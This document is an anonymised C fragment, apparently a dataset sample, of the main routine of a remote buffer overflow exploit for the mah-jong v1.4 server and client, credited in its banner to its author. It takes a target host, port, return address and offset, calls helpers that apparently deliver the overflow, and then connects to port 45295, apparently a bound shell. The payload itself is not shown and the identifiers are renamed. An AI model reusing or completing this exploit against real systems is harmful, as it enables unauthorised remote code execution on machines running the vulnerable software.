
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;
 unsigned int VAR_0 ;
 unsigned short VAR_1 ;
 unsigned int FUNC_0 (char*) ;
 int FUNC_1 (int) ;
 int FUNC_2 (char*,int) ;
 char* FUNC_3 (unsigned short,unsigned int) ;
 int FUNC_4 (char*,unsigned short,unsigned int) ;
 int FUNC_5 (char*,...) ;
 int FUNC_6 (int) ;
 int FUNC_7 (char*,char*,unsigned int*) ;
 int FUNC_8 (char*,char*) ;

int FUNC_9(int VAR_2,char **VAR_3){
 unsigned short VAR_4=0,VAR_5=VAR_1;
 unsigned int VAR_6=VAR_0;
 char *VAR_7;
 FUNC_5("[*] mah-jong[v1.4]: server/client remote buffer overflow ex"
 "ploit.\n[*] by: vade79/v9 v9@fakehalo.deadpig.org (fakehalo)\n\n");
 if(VAR_2<2){
  FUNC_5("[!] syntax: %s <host|-b> [port] [return address] [offset]\n",
  VAR_3[0]);
  FUNC_1(1);
 }
 if(!FUNC_8(VAR_3[1],"-b"))VAR_4=1;
 if(VAR_2>2)VAR_5=FUNC_0(VAR_3[2]);
 if(VAR_2>3)FUNC_7(VAR_3[3],"%x",&VAR_6);
 if(VAR_2>4)VAR_6+=FUNC_0(VAR_3[4]);
 FUNC_5("[*] target: %s:%u, return address(buffer.1+512): 0x%.8x.\n\n",
 VAR_4?"*":VAR_3[1],VAR_5,VAR_6);
 if(VAR_4)VAR_7=FUNC_3(VAR_5,VAR_6);
 else FUNC_4((VAR_7=VAR_3[1]),VAR_5,VAR_6);
 FUNC_6(1);
 FUNC_2(VAR_7,45295);
 FUNC_1(0);
}
